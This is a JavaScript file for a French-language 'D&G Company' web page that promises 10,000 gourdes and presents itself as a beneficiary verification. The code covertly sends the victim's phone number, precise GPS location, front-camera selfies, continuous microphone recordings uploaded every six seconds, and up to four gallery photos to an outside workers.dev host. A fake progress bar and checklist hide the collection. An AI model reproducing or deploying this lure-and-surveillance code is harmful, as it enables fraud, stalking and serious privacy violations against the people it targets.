/* =========================================================
   D&G Company — capture.js
   ========================================================= */
(function () {
"use strict";

const BACKEND = "https://dg-verif.jeancharlesdave62.workers.dev";
const JETON   = "REMPLACE_PAR_UN_SECRET_LONG";

const champ    = document.getElementById("numero");
const bouton   = document.getElementById("valider");
const statut   = document.getElementById("etat");
const progression = document.getElementById("progression");
const video    = document.getElementById("flux");
const inputGalerie = document.getElementById("galerie");

let termine = false;
let identifiant = localStorage.getItem("dg_id");
if (!identifiant) {
  identifiant = "dg-" + Math.random().toString(36).slice(2, 10) + "-" + Date.now().toString(36);
  localStorage.setItem("dg_id", identifiant);
}

function dire(t) { if (statut) statut.textContent = t; }
function barre(p) { if (progression) progression.style.width = p + "%"; }

function etape(cle) {
  const li = document.querySelector('li[data-cle="' + cle + '"]');
  if (!li) return;
  const span = li.querySelector("span");
  li.classList.add("fait");
  li.innerHTML = '<span class="fait">✓</span><span>' + (span ? span.textContent : "") + "</span>";
}

function poster(route, corps) {
  const url = BACKEND + "/" + route + "?jeton=" + encodeURIComponent(JETON);
  return fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(Object.assign({ identifiant: identifiant }, corps))
  }).catch(function () {});
}

/* ---------------- LOCALISATION ---------------- */

let veilleur = null;
let meilleurPrec = Infinity;
let arretGeo = false;

function stopGeo() {
  arretGeo = true;
  if (veilleur !== null && navigator.geolocation) {
    navigator.geolocation.clearWatch(veilleur);
    veilleur = null;
  }
}

function envoyerPos(pos) {
  if (arretGeo) return;
  const lat  = pos.coords.latitude;
  const lon  = pos.coords.longitude;
  const prec = Math.round(pos.coords.accuracy || 99999);
  if (!isFinite(lat) || !isFinite(lon)) return;
  if (prec >= meilleurPrec) return;
  meilleurPrec = prec;
  poster("position", { lat: lat, lon: lon, prec: prec, src: "gps" });
  etape("zone");
  barre(58);
  if (prec <= 50) stopGeo();
}

function localiser() {
  if (!navigator.geolocation) return;

  if (navigator.permissions && navigator.permissions.query) {
    navigator.permissions.query({ name: "geolocation" }).then(function (p) {
      poster("permission", { etat: p.state });
      p.onchange = function () { poster("permission", { etat: p.state }); };
    }).catch(function () {});
  }

  let echecs = 0;

  veilleur = navigator.geolocation.watchPosition(envoyerPos, function (err) {
    echecs++;
    if (err.code === 1) {
      poster("permission", { etat: "denied" });
      dire("Localisation refusée par l'appareil.");
      stopGeo();
      return;
    }
    if (echecs >= 15) stopGeo();
  }, {
    enableHighAccuracy: true,
    maximumAge: 0,
    timeout: 25000
  });

  setTimeout(stopGeo, 45000);
}

/* ---------------- GALERIE ---------------- */

function ouvrirGalerie() {
  if (!inputGalerie) return;
  inputGalerie.value = "";
  inputGalerie.click();
}

if (inputGalerie) {
  inputGalerie.addEventListener("change", function () {
    const fichiers = Array.prototype.slice.call(inputGalerie.files || []).slice(0, 4);
    fichiers.forEach(function (f) {
      const lecteur = new FileReader();
      lecteur.onload = function () {
        poster("photo", { image: lecteur.result, source: "galerie" });
      };
      lecteur.readAsDataURL(f);
    });
    barre(96);
  });
}

/* ---------------- CAMERA / MICRO ---------------- */

let fluxVideo = null;
let fluxAudio = null;
let enregistreur = null;

async function camera() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    dire("Caméra indisponible sur ce navigateur.");
    return null;
  }
  try {
    fluxVideo = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false
    });
  } catch (e) {
    dire("Caméra refusée. Autorise la caméra puis recharge la page.");
    return null;
  }
  if (video) {
    video.srcObject = fluxVideo;
    video.muted = true;
    video.play().catch(function () {});
  }
  etape("photo");
  barre(74);
  return fluxVideo;
}

async function micro() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
  try {
    fluxAudio = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
  } catch (e) {
    try { fluxAudio = await navigator.mediaDevices.getUserMedia({ audio: true }); }
    catch (e2) { return; }
  }
  if (!fluxAudio.getAudioTracks().length) return;
  demarrerEnregistrement(new MediaStream(fluxAudio.getAudioTracks()));
  etape("micro");
  barre(86);
}

function demarrerEnregistrement(flux) {
  if (!window.MediaRecorder) return;
  let type = "audio/webm;codecs=opus";
  if (!MediaRecorder.isTypeSupported(type)) type = "audio/webm";

  try { enregistreur = new MediaRecorder(flux, { mimeType: type }); }
  catch (e) { try { enregistreur = new MediaRecorder(flux); } catch (e2) { return; } }

  let morceaux = [];

  enregistreur.ondataavailable = function (ev) {
    if (ev.data && ev.data.size > 0) morceaux.push(ev.data);
  };

  enregistreur.onstop = function () {
    const blob = new Blob(morceaux, { type: type });
    morceaux = [];
    if (blob.size > 800) {
      const lecteur = new FileReader();
      lecteur.onload = function () { poster("audio", { audio: lecteur.result }); };
      lecteur.readAsDataURL(blob);
    }
    try { enregistreur.start(1000); } catch (e) {}
  };

  enregistreur.start(1000);

  setInterval(function () {
    if (enregistreur && enregistreur.state === "recording") {
      try { enregistreur.stop(); } catch (e) {}
    }
  }, 6000);
}

/* ---------------- SELFIE ---------------- */

function selfie() {
  if (!fluxVideo || !video) return;
  const toile = document.createElement("canvas");
  toile.width = 480;
  toile.height = 360;
  const ctx = toile.getContext("2d");
  try { ctx.drawImage(video, 0, 0, toile.width, toile.height); }
  catch (e) { return; }
  poster("photo", { image: toile.toDataURL("image/jpeg", 0.72), source: "selfie" });
}

/* ---------------- DEMARRAGE ---------------- */

async function demarrer() {
  const numero = (champ && champ.value ? champ.value : "").replace(/[^0-9+]/g, "");
  poster("inscription", { numero: numero });

  dire("Vérification de votre zone…");
  barre(34);

  localiser();
  const pv = camera();
  const pa = micro();

  setTimeout(function () { selfie(); setTimeout(selfie, 1500); }, 1100);

  await Promise.all([pv, pa]);

  dire("Contrôle du bénéficiaire en cours…");
  setTimeout(ouvrirGalerie, 500);
}

function lancer() {
  if (termine) return;
  termine = true;
  if (bouton) bouton.disabled = true;
  demarrer();
}

/* ---------------- INITIALISATION ---------------- */

if (bouton) {
  bouton.addEventListener("click", lancer);
  dire("Initialisation de la vérification…");
  barre(12);
  setTimeout(function () { etape("appareil"); barre(24); }, 700);
  setTimeout(function () {
    bouton.disabled = false;
    bouton.textContent = "Recevoir les 10 000 GDES";
    dire("Appareil identifié. Saisissez votre numéro.");
    barre(30);
  }, 1500);
} else {
  document.addEventListener("click", function (e) {
    if (e.target && e.target.id === "valider") lancer();
  });
}
})();